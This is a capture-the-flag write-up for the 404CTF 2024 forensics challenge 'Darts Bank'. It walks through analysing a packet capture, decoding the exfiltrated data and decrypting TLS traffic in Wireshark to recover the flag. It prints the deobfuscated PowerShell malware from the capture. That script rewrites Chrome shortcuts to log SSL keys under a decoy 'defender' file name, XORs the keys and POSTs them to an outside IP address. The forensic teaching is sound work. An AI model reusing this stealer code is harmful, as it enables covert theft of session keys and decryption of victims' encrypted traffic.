---
title: CTFs | 404CTF_2024 | Investigation Numerique | Darts Bank
author: BatBato
date: 2024-04-25
categories:
  - CTFs
  - 404_CTF_2024
  - Investigation Numerique
tags:
  - Forensique
  - Forensic
permalink: /CTFs/404_CTF_2024/Investigation_Numerique/Darts_Bank
---
# Darts Bank

![[dart_enonce.png]](https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/404_CTF_2024/Invesigation_numerique/Photos/dart_enonce.png)

In this challenge, we are given [this pcap](https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/404_CTF_2024/Invesigation_numerique/dart.pcapng)  file. If we open it using wireshark, we can see a lot of `HTTP` traffic. When we click on the first one and follow the TCP stream, we get the following output on the third stream:

![[dart_wireshark.png]](https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/404_CTF_2024/Invesigation_numerique/Photos/dart_wireshark.png)

As you can see, this is some powershell script that has been base64 encoded. Once decoded and deobfuscated, we obtain the following code (available [here](https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/404_CTF_2024/Invesigation_numerique/script.ps1)):

```powershell
foreach($bbbbbbbbbbbb in Get-ChildItem -Recurse -Path C:\Users -ErrorAction SilentlyContinue -Include *.lnk){

$bbbbbbbbbbbbbbb=New-Object -COM WScript.Shell;

$bbbbbbbbbbbbbbbb=$bbbbbbbbbbbbbbb.CreateShortcut($bbbbbbbbbbbb);

  if($bbbbbbbbbbbbbbbb.TargetPath -match 'chrome\.exe$'){

    $bbbbbbbbbbbbbbbb.Arguments="--ssl-key-log-file=$env:TEMP\defender-res.txt";

    $bbbbbbbbbbbbbbbb.Save();

  }

}

$count=0;
$file_path="$env:TEMP\defender-res.txt";
$byte_array=[byte[]](215,194,...,120);

while($true){

  $file_info=Get-Item -Path $file_path;
  $file_size=$file_info.Length;

  if($file_size -gt $count){
    $defender_res=[System.IO.File]::Open($file_path,[System.IO.FileMode]::Open, [System.IO.FileAccess]::Read,[System.IO.FileShare]::ReadWrite);
    $defender_res.Seek($count,[System.IO.SeekOrigin]::Begin)|Out-Null;
    $b64_str=New-Object byte[] ($file_size - $count);
    $defender_res.read($b64_str,0,$file_size - $count)|Out-Null;

    for($i=0;$i -lt $b64_str.count;$i++){

      $b64_str[$i]=$b64_str[$i] -bxor $byte_array[$i % $byte_array.count];

    }

    $data=[Convert]::ToBase64String($b64_str);

    Write-Output $data;

    Invoke-WebRequest -Uri http://192.168.78.89/index.html -Method POST -Body $data|Out-Null;

    $defender_res.Close()|Out-Null;

  }

  $count=$file_size;

  Start-Sleep -Seconds 5;

}
```

The problem here was to understand what this powershell does. And it was "just" a `XOR` between the key (big string of byte) and the message saved in `defender-res.txt`. The encoded message could be found in the next streams. I exported every `index.html` and used [this script](https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/404_CTF_2024/Invesigation_numerique/exploit.py). I first read the content of each `index.html` file that I exported and then decode the base64 to `XOR` it with the key.

We get the following result:

![[dart_cert.png]](https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/404_CTF_2024/Invesigation_numerique/Photos/dart_cert.png)

After a bit of research, I found [this article ](https://www.comparitech.com/net-admin/decrypt-ssl-with-wireshark/) on how to decrypt `SSL` traffic in `Wireshark`. So we need to save the content of all those `index.html` file decoded into a single file and put it into `Wireshark` like so:

![[dart_wireshark1.png]](https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/404_CTF_2024/Invesigation_numerique/Photos/dart_wireshark1.png)

Now, we can read the content of all HTTPS messages. We can use the filter `http2.data.data && data-text-lines contains "404CTF"` to find the flag easily and... Voilà:

![[dart_flag.png]](https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/404_CTF_2024/Invesigation_numerique/Photos/dart_flag.png)

The flag is `404CTF{En_pl31n_d4ns_l3_1337_v1@_sUp3r_TLS_d3crypt0r}`.